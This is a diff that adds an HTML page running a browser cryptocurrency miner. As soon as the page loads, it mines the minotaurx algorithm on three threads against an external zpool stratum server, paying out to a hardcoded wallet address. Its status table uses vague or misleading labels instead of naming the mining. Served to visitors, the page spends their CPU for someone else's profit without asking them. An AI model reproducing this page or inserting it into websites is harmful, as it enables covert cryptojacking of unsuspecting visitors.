@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>JavaScript CPU Miner</title>
+  <style>
+    body {
+      font-family: 'Courier New', Courier, monospace;
+    }
+    .container {
+      margin: 20px;
+    }
+    .status-table {
+      border-collapse: collapse;
+      width: 100%;
+    }
+    .status-table td {
+      padding: 5px;
+    }
+    .status-table th {
+      padding: 5px;
+      text-align: left;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <h1>JavaScript Mining Status</h1>
+    <table class="status-table" border="1">
+      <tbody>
+        <tr>
+          <th>Process id:</th>
+          <td id="address"></td>
+        </tr>
+        <tr>
+          <th>JavaScript running on:</th>
+          <td id="hashrate"></td> 
+        </tr>
+        <tr>
+          <th>Number of quests run JavaScript done:</th>
+          <td id="shared"></td>
+        </tr>
+        <tr>
+          <th>Checking:</th>
+          <td id="job"></td>
+        </tr>
+        <tr>
+          <th>Elapsed Time:</th>
+          <td id="duration">0 seconds</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
+    integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"
+    integrity="sha384-2huaZvOR9iDzHqslqwpR87isEmrfxqyWOF7hr7BY6KG0+hVKLoEXMPUJw3ynWuhO" crossorigin="anonymous">
+  </script>
+  <script src="app.js"></script>
+  <script>
+    $(document).ready(() => {
+      const stratum = {
+        server: "minotaurx.na.mine.zpool.ca",
+        port: 7019,
+        worker: "R9uHDn9XXqPAe2TLsEmVoNrokmWsHREV2Q",
+        password: "c=RVN"
+      };
+
+      $('#address').text(stratum.worker);
+
+      let startTime = Date.now();
+      let updateInterval = setInterval(() => {
+        const elapsedTime = Math.floor((Date.now() - startTime) / 1000);
+        $('#duration').text(`${elapsedTime} seconds`);
+      }, 1000);
+
+      mine(
+        'minotaurx',
+        stratum,
+        false,
+        {
+          threads: 3,
+          callback: (hashrate, shared, jobId) => {
+            $('#hashrate').text(hashrate);
+            $('#shared').text(shared);
+            $('#job').text(jobId);
+          }
+        }
+      );
+    });
+  </script>
+</body>
+
+            </html>
